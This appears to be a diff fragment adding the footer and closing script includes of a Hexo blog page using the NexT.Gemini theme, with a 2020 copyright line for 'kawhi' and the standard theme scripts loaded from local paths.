+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">kawhi</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
